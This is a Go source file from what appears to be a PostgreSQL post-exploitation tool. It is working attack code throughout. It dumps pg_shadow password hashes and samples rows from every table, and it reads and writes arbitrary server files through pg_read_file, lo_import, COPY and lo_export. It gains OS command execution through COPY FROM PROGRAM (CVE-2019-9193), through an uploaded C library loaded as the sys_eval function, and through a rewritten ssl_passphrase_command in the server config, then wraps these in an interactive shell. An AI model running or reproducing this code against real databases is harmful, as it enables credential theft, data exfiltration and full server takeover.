package core

import (
	"database/sql"
	"davinci/common"
	"davinci/common/log"
	"davinci/core/pgsql"
	"encoding/hex"
	"errors"
	"fmt"
	"github.com/c-bata/go-prompt"
	_ "github.com/lib/pq"
	"strings"
	"time"
)

var excludePgDB = []string{
	"template1",
	"template0",
}

var excludePgSchema = []string{
	"pg_toast",
	"pg_temp_1",
	"pg_toast_temp_1",
	"pg_catalog",
	"information_schema",
}

type Pgsql struct {
	conn   *sql.DB
	Host   string
	Port   int
	User   string
	Passwd string
	DbName string
	Cmd    string
}

func (p *Pgsql) connect() error {
	var err error
	if p.conn == nil {
		dataSrc := fmt.Sprintf("postgres://%s:%s@%s:%d/%s?sslmode=disable&connect_timeout=10", p.User, p.Passwd, p.Host, p.Port, p.DbName)
		if p.conn, err = sql.Open("postgres", dataSrc); err != nil {
			log.Error(err)
		} else if err = p.conn.Ping(); err != nil {
			log.Error(err)
		}
	}
	return err
}

func (p *Pgsql) Close() {
	if p.conn != nil {
		p.conn.Close()
		p.conn = nil
	}
}

func (p *Pgsql) ExecuteOnce() {
	if p.connect() != nil {
		return
	}

	result := p.execute(p.Cmd)
	log.Output(result)
}

func (p *Pgsql) AutoGather() {
	if p.connect() != nil {
		return
	}

	log.Output(p.getVersion())
	log.Output(p.getUsers())
	log.Output(p.getPgLanguage())
	databases := p.getDatabases()
	log.Output(databases)

	//excludeDbs := p.getExcludeDbs()
	log.Info(fmt.Sprintf("exclude database(built-in): %s", strings.Join(excludePgDB, ",")))
	for _, db := range common.GetColumnData(databases, 0) {
		if common.Contains(excludePgDB, strings.ToLower(db)) {
			continue
		}
		p.gatherInOneDb(db)
	}

	log.Output(p.getExtensions())
	log.Output(p.getSettings())
}

func (p *Pgsql) SetHost(host string) {
	p.Host = host
}
func (p *Pgsql) SetPort(port int) {
	p.Port = port
}

func (p *Pgsql) SetCmd(cmd string) {
	p.Cmd = cmd
}

func (p *Pgsql) gatherInOneDb(dbName string) {
	p.Close()
	p.DbName = dbName
	if p.connect() != nil {
		return
	}
	log.Output(p.getCurrentDb())
	log.Output(p.getDatabaseSize(dbName))
	schemas := p.getSchemas()
	log.Output(schemas)

	log.Info(fmt.Sprintf("exclude schemas(built-in): %s", strings.Join(excludePgSchema, ",")))
	for _, schema := range common.GetColumnData(schemas, 0) {
		if common.Contains(excludePgSchema, strings.ToLower(schema)) {
			continue
		}
		tables := p.getTables(schema)
		log.Output(tables)
		for _, table := range common.GetColumnData(tables, 0) {
			tableStruct := p.getTableStruct(schema, table)
			log.Output(tableStruct)
			dataSum := p.getSumRows(schema, table)
			log.Output(dataSum)
			datas := p.getFirst5Rows(schema, table)
			log.Output(datas)
		}
	}
}

func (p *Pgsql) Shell() {

	if p.connect() != nil {
		return
	}
	sqlShell(p.execute)

}

func (p *Pgsql) execute(cmd string) [][]string {
	return execute(p.conn, cmd)
}

func (p *Pgsql) getDatabases() [][]string {
	sql := "SELECT datname FROM pg_catalog.pg_database;"
	log.Info("get databases")
	return p.execute(sql)
}

func (p *Pgsql) getDatabaseSize(dbName string) [][]string {
	sql := fmt.Sprintf("SELECT pg_size_pretty( pg_database_size('%s') );", dbName)
	log.Info("get database size: " + dbName)
	return p.execute(sql)
}

func (p *Pgsql) getSchemas() [][]string {
	sql := "SELECT schema_name,catalog_name,sql_path FROM information_schema.schemata;"
	log.Info("get schemas")
	return p.execute(sql)
}

func (p *Pgsql) getTables(schemaName string) [][]string {
	sql := fmt.Sprintf("SELECT table_name from information_schema.tables where table_schema='%s'", schemaName)
	log.Info(fmt.Sprintf("[info] get tables in %s ", schemaName))
	return p.execute(sql)
}

func (p *Pgsql) getTableStruct(schemaName, tbName string) [][]string {
	sql := fmt.Sprintf("SELECT column_name,data_type,column_default FROM information_schema.columns WHERE table_schema='%s' and table_name = '%s';", schemaName, tbName)
	return p.execute(sql)
}

func (p *Pgsql) getSumRows(schemaName, tbName string) [][]string {
	sql := fmt.Sprintf("select count(*) from %s.%s;", schemaName, tbName)
	log.Info(fmt.Sprintf("get total number of rows in table [%s]", tbName))
	return p.execute(sql)
}

func (p *Pgsql) getFirst5Rows(schemaName, tbName string) [][]string {
	sql := fmt.Sprintf("select * from %s.%s limit 5;", schemaName, tbName)
	log.Info(fmt.Sprintf("get first 5 rows in table [%s.%s]", schemaName, tbName))
	return p.execute(sql)
}

func (p *Pgsql) getUsers() [][]string {
	sql := fmt.Sprintf("SELECT usename,passwd FROM pg_shadow;")
	log.Info("get users")
	return p.execute(sql)
}

func (p *Pgsql) getCurrentDb() [][]string {
	sql := fmt.Sprintf("select current_database();")
	log.Info("get current database")
	return p.execute(sql)
}

func (p *Pgsql) getVersion() [][]string {
	sql := fmt.Sprintf("select version();")
	log.Info("get version")
	return p.execute(sql)
}

func (p *Pgsql) getExtensions() [][]string {
	sql := fmt.Sprintf("select * from pg_available_extensions")
	log.Info("get extensions")
	return p.execute(sql)
}

func (p *Pgsql) getSettings() [][]string {
	sql := fmt.Sprintf("select name,setting from pg_settings")
	log.Info("get pg settings")
	return p.execute(sql)
}

func (p *Pgsql) ReadFile_by_PgReadFile(path string) (result string, err error) {
	if p.connect() != nil {
		return
	}
	sql := fmt.Sprintf("select pg_read_file('%s')", path)
	log.Info("read file by pg_read_file")
	if res := p.execute(sql); res != nil {
		result = res[1][0]
	} else {
		err = errors.New("execute pg_read_file function err")
		log.Warn("read file fail")
	}
	return
}

func (p *Pgsql) ReadFile_by_LoImport(path string, hex bool) (result string, err error) {
	if p.connect() != nil {
		return
	}
	log.Info("read file by lo_import()")
	oid := p.getUniqueOid()
	defer func() {
		p.execute(fmt.Sprintf("select lo_unlink(%s)", oid))
		event := recover()
		if event != nil {
			err = event.(error)
			log.Warn("read file fail")
			log.Warn(event)
		}
	}()
	p.execute(fmt.Sprintf("select lo_import('%s',%s);", path, oid))
	var sql string
	if hex {
		sql = fmt.Sprintf("select encode(data,'hex') from pg_largeobject where loid=%s", oid)
	} else {
		sql = fmt.Sprintf("select data from pg_largeobject where loid=%s", oid)
	}

	if res := p.execute(sql); res != nil {
		datas := common.GetColumnData(res, 0)
		result = strings.Join(datas, "")
	}
	return
}

func (p *Pgsql) ReadFile_by_CopyFrom(path string, hex bool) (result string, err error) {
	if p.connect() != nil {
		return
	}
	log.Info("read file by copy from")
	defer func() {
		event := recover()
		if event != nil {
			err = event.(error)
			log.Warn("read file fail")
			log.Warn(event)
		}
	}()
	tableName := p.getUniqueTableName()
	p.execute(fmt.Sprintf("create table %s(data TEXT);", tableName))
	p.execute(fmt.Sprintf("copy %s from '%s';", tableName, path))
	var sql string
	if hex {
		sql = fmt.Sprintf("select encode(data::bytea,'hex') from %s ", tableName)
	} else {
		sql = fmt.Sprintf("select data from %s", tableName)
	}

	if res := p.execute(sql); res != nil {
		datas := common.GetColumnData(res, 0)
		sep := "\n"
		if hex {
			sep = "0A"
		}
		result = strings.Join(datas, sep)
		p.execute(fmt.Sprintf("drop table %s;", tableName))
	}
	return
}

func (p *Pgsql) WriteFile_by_LoExport(hex, path string) bool {
	if p.connect() != nil {
		return false
	}
	oid := p.getUniqueOid()
	defer func() {
		p.execute(fmt.Sprintf("select lo_unlink(%s)", oid))
		err := recover()
		if err != nil {
			log.Warn("write fail")
			log.Warn(err)
		}
	}()
	sql1 := fmt.Sprintf("select lo_from_bytea(%s,decode('%s','hex'));", oid, hex)
	log.Info("lo_export write file")
	if result := p.execute(sql1); result != nil {
		sql2 := fmt.Sprintf("select lo_export(%s, '%s');", oid, path)
		//_,err := p.conn.Query("")
		if p.execute(sql2) != nil {
			log.Info("write success")
			return true
		}
	}
	log.Warn("write fail")
	return false
}

func (p *Pgsql) WriteFile_by_CopyTo(hex, path string) bool {
	if p.connect() != nil {
		return false
	}
	sql := fmt.Sprintf("copy (select convert_from(decode('%s','hex'),'utf-8')) to '%s';", hex, path)
	log.Info("copy to write file")
	if result := p.execute(sql); result != nil {
		log.Info("write success")
		return true
	}
	log.Warn("write fail")
	return false
}

func (p *Pgsql) ListDir_by_PgLsDir(path string) (result [][]string, err error) {
	if p.connect() != nil {
		return
	}
	sql := fmt.Sprintf("select pg_ls_dir('%s')", path)
	log.Info("list dir by pg_ls_dir")
	if result = p.execute(sql); result == nil {
		err = errors.New("execute pg_ls_dir function err")
		log.Warn("list dir fail")
	}
	return
}

func (p *Pgsql) Mkdir_by_LogDirectory(path string) bool {
	if p.connect() != nil {
		return false
	}
	defer func() {
		err := recover()
		if err != nil {
			log.Warn("mkdir dir fail: ", err)
		}
	}()
	logOpen := p.execute("select setting from pg_settings where name='logging_collector'")
	if logOpen[1][0] != "on" {
		log.Warn("logging_collector is off")
		return false
	}
	configPath := p.execute("select setting from pg_settings where name='config_file'")[1][0]
	log.Info("config_file: ", configPath)
	configContent, _ := p.ReadFile_by_PgReadFile(configPath)
	newContent := pgsql.PatchPgConfig(configContent, "log_directory", fmt.Sprintf("'%s'", path))
	if p.WriteFile_by_LoExport(hex.EncodeToString([]byte(newContent)), configPath) {
		p.execute("select pg_reload_conf();")
		time.Sleep(5 * 100 * time.Millisecond)
		p.execute("select setting from pg_settings where name='log_directory'")
		oid := p.getUniqueOid()
		sql := fmt.Sprintf("select lo_import('%s',%s);", path, oid)
		log.Info("execute sql:", sql)
		_, err := p.conn.Query(sql)
		if err != nil && strings.Contains(err.Error(), "Is a directory") {
			log.Info("mkdir dir success")
			return true
		}
		log.Error(err.Error())
	}
	log.Warn("mkdir dir fail")
	return false
}

func (p *Pgsql) OsExec_cve_2019_9193(cmd string) (string, bool) {
	tableName := p.getUniqueTableName()
	p.execute(fmt.Sprintf("CREATE TABLE %s(output text);", tableName))
	cmd = strings.ReplaceAll(cmd, "'", "''")
	p.execute(fmt.Sprintf("COPY %s FROM PROGRAM '%s';", tableName, cmd))
	res := p.execute(fmt.Sprintf("select output from %s", tableName))
	var flag = false
	var result string
	if res != nil {
		flag = true
		result = strings.Join(common.GetColumnData(res, 0), "\n")
	}
	p.execute(fmt.Sprintf("DROP TABLE IF EXISTS %s;", tableName))
	return result, flag
}

func (p *Pgsql) OsExec_UDF(cmd string) (string, bool) {

	cmd = strings.ReplaceAll(cmd, "'", "''")

	exist := p.execute("select * from pg_proc where proname='sys_eval'")
	if exist == nil || len(exist) <= 1 {
		if !p.createUdf() {
			return "", false
		}
	}
	res := p.execute(fmt.Sprintf("select sys_eval('%s')", cmd))
	if res != nil {
		return res[1][0], true
	}
	return "", false
}

func (p *Pgsql) createUdf() bool {
	if p.connect() != nil {
		return false
	}
	defer func() {
		err := recover()
		if err != nil {
			log.Warn(err)
		}
	}()
	version := p.execute("show server_version")[1][0]
	info := strings.ToLower(p.execute("select version()")[1][0])
	var os string
	var platform string
	var ext string
	if strings.Contains(info, "linux") {
		os = "linux"
		ext = "so"
	} else if strings.Contains(info, "win") {
		os = "windows"
		ext = "dll"
	} else {
		log.Warn("unkonw/unsupport os: " + info)
		return false
	}

	if strings.Contains(info, "x86_64") || strings.Contains(info, "amd64") {
		platform = "x86_64"
	} else if strings.Contains(info, "i386") || strings.Contains(info, "i686") || strings.Contains(info, "x86") {
		platform = "x86_32"
	} else if strings.Contains(info, "aarch64") {
		platform = "arm64"
	} else {
		log.Warn("unkonw/unsupport platform: " + info)
		return false
	}

	udf := pgsql.GetPgsqlUdf(os, platform, version)
	if udf == "" {
		return false
	}

	dir := "/tmp/"
	if dirRes := p.execute("select current_setting('data_directory')"); dirRes != nil {
		if dirRes[1][0] != "" {
			dir = dirRes[1][0]
		}
		if !strings.HasSuffix(dir, "/") {
			dir = dir + "/"
		}
	}
	path := fmt.Sprintf("%s%s.%s", dir, common.GetRandomAlapha(8), ext)
	p.WriteFile_by_LoExport(udf, path)
	if p.execute(fmt.Sprintf("create or replace function sys_eval(text) returns text as '%s','sys_eval' language c strict;", path)) != nil {
		return true
	}
	return false
}

func (p *Pgsql) OsExec_ssl_passpharse_command(cmd string) bool {
	if p.connect() != nil {
		return false
	}
	defer func() {
		err := recover()
		if err != nil {
			log.Warn(err)
		}
	}()
	version := p.execute("show server_version")[1][0]
	if common.CompareVersion("11", version, ".") {
		log.Warn("version < 11")
		return false
	}
	// 写入ssl_key_file
	var passwd = "12345678"
	snakeoilPem, _ := p.ReadFile_by_LoImport("/etc/ssl/private/ssl-cert-snakeoil.key", false)
	privatePass, _ := common.EncryptRSAPrivateKey([]byte(snakeoilPem), passwd)
	dirRes := p.execute("select current_setting('data_directory')")[1][0]
	pgVersionPath := dirRes + "/PG_VERSION"
	p.WriteFile_by_LoExport(hex.EncodeToString(privatePass), pgVersionPath)

	// 写入新配置
	configPath := p.execute("select setting from pg_settings where name='config_file'")[1][0]
	log.Info("config_file: ", configPath)
	configContent, _ := p.ReadFile_by_PgReadFile(configPath)
	newContent := pgsql.PatchPgConfig(configContent, "ssl", "on")
	newContent = pgsql.PatchPgConfig(newContent, "ssl_cert_file", "'/etc/ssl/certs/ssl-cert-snakeoil.pem'")
	newContent = pgsql.PatchPgConfig(newContent, "ssl_key_file", fmt.Sprintf("'%s'", pgVersionPath))
	newContent = pgsql.PatchPgConfig(newContent, "ssl_passphrase_command_supports_reload", "on")
	newContent = pgsql.PatchPgConfig(newContent, "ssl_passphrase_command", fmt.Sprintf("'sh -c \"%s & echo %s; exit 0\"'", cmd, passwd))
	p.WriteFile_by_LoExport(hex.EncodeToString([]byte(newContent)), configPath)

	// 重置执行
	p.execute("select pg_reload_conf();")
	return true
}

func (p *Pgsql) getPgLanguage() [][]string {
	log.Info("get pg_language")
	return p.execute("select * from pg_language")
}

func (p *Pgsql) getUniqueOid() string {
	var oid string
	for oid = common.GetRandomNum(6); ; {
		res := p.execute(fmt.Sprintf("select count(*) from pg_largeobject where loid=%s", oid))
		if res[1][0] == "0" {
			break
		}
	}
	return oid
	return oid
}

func (p *Pgsql) getUniqueTableName() string {
	if p.DbName == "" {
		p.DbName = "postgres"
	}
	tables := common.GetColumnData(p.getTables(p.DbName), 0)
	for tableName := common.GetRandomAlapha(10); ; {
		if !common.Contains(tables, tableName) {
			return tableName
		}
	}
}

type osExecPgFunc func(cmd string) (string, bool)

func (p *Pgsql) ExecOsShell(cmd string, interactive bool, execFunc osExecPgFunc) {
	if p.connect() != nil {
		return
	}
	if interactive {
		pmt := prompt.New(func(in string) {},
			func(document prompt.Document) []prompt.Suggest {
				return nil
			})

		for {
			in := pmt.Input()
			if strings.EqualFold(in, "exit") || strings.EqualFold(in, "exit()") {
				break
			}
			if strings.Trim(in, " ") == "" {
				continue
			}
			if result, flag := execFunc(in); flag {
				log.Output(result)
			}
		}
	} else {
		if result, flag := execFunc(cmd); flag {
			log.Output(result)
		}
	}
}
